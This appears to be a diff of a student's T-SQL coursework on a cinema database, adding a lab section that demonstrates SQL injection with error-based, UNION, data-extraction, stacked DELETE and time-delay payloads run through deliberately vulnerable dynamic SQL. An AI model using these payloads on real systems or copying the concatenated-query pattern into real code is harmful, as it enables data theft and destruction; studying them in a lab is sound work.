@@ -586,7 +586,7 @@ SELECT
     l.cp    
 FROM Reporte1 r
 INNER JOIN ListaDomicilio l
-    ON r.nombre_reporte1 = l.nombre
+    ON r.id_original_reporte1 = l.id_original
     AND r.tipo_reporte1 = l.tipo;
 
 -- g) Crear índice en la tabla NuevoRegistro
@@ -634,6 +634,7 @@ CREATE TABLE Registro2 (
 BEGIN TRAN;
 SELECT * INTO Registro2_copia FROM Registro2;
 DROP TABLE Registro2;
+
 -- Insertar registros que cumplen la edad y género y últimos domicilios
 
 -- De Cliente
@@ -680,3 +681,127 @@ select * from Registro2_copia;
 ROLLBACK;
 
 select * from Registro2;
+
+
+
+use Cine;
+
+------ Practica 4 -------
+use Cine;
+--- a. sqli basado en errores
+
+-- Simulación de input malicioso (escapando comillas correctamente)
+DECLARE @correo NVARCHAR(500) = ''''' AND 1=CONVERT(int, (SELECT @@VERSION))--';
+
+-- Consulta vulnerable construida dinámicamente
+DECLARE @sql NVARCHAR(MAX);
+SET @sql = 'SELECT * FROM Cliente WHERE correo_cliente = ' + @correo;
+
+-- Muestra la consulta generada
+PRINT @sql;
+
+-- Ejecuta
+EXEC(@sql);
+
+
+--- b. union
+
+---- reiniciar 
+GO
+-- Simulación de inyección SQL basada en uniones
+DECLARE @correo NVARCHAR(MAX);
+
+SET @correo = 
+''''' UNION SELECT 
+    CAST(id_empleado AS VARCHAR),
+	nombre_empleado,
+	apePat_empleado,
+	apeMat_empleado,
+	correo_empleado,
+	telefono_empleado,
+    CAST(fechaNac_empleado AS VARCHAR), 
+    genero_empleado, 
+    calle_empleado, 
+    numero_empleado, 
+    colonia_empleado, 
+    ciudad_empleado, 
+    estado_empleado,
+	cp_empleado
+FROM Empleado--''';
+
+-- Construcción dinámica de consulta vulnerable
+DECLARE @sql NVARCHAR(MAX);
+SET @sql = 'SELECT * FROM Cliente WHERE correo_cliente = ' + @correo;
+
+-- Mostrar para debug
+PRINT @sql;
+
+-- Ejecutar consulta vulnerable
+EXEC(@sql);
+
+select * from Cliente;
+
+
+--- c. extraccion de datos
+
+
+
+-- Reiniciar contexto
+GO
+
+-- Input malicioso para extracción de datos
+DECLARE @nombre NVARCHAR(MAX) = 
+''''' OR nombre_cliente = (SELECT TOP 1 nombre_empleado FROM Empleado)--''''';
+
+-- Construcción de consulta dinámica
+DECLARE @sql NVARCHAR(MAX);
+SET @sql = 'SELECT * FROM Cliente WHERE nombre_cliente = ' + @nombre;
+
+-- Mostrar la consulta generada
+PRINT @sql;
+
+-- Ejecutar (puede devolver datos si el correo existe en ambas tablas)
+EXEC(@sql);
+
+
+---- d. eliminacion de datos
+
+-- Reiniciar contexto
+GO
+
+-- Input malicioso simulado
+DECLARE @nombre NVARCHAR(MAX) = 
+''''' OR 1=1; DELETE FROM NuevoRegistro;--''';
+
+-- Construcción de consulta vulnerable
+DECLARE @sql NVARCHAR(MAX);
+SET @sql = 'SELECT * FROM NuevoRegistro WHERE nombre_nregistro = ' + @nombre;
+
+-- Mostrar la consulta construida
+PRINT @sql;
+
+-- Ejecutar
+EXEC(@sql);
+
+SELECT COUNT(*) FROM NuevoRegistro;
+select * from NuevoRegistro;
+
+
+--- e. sqli basada en el tiempo
+
+-- Reiniciar contexto
+GO
+
+-- Input malicioso que provoca un retraso de 5 segundos
+DECLARE @correo NVARCHAR(MAX) = 
+''''' OR 1=1; WAITFOR DELAY ''00:00:05'';--''';
+
+-- Construcción dinámica vulnerable
+DECLARE @sql NVARCHAR(MAX);
+SET @sql = 'SELECT * FROM Cliente WHERE correo_cliente = ' + @correo;
+
+-- Mostrar consulta generada
+PRINT @sql;
+
+-- Ejecutar: si la inyección es efectiva, tardará 5 segundos
+EXEC(@sql);
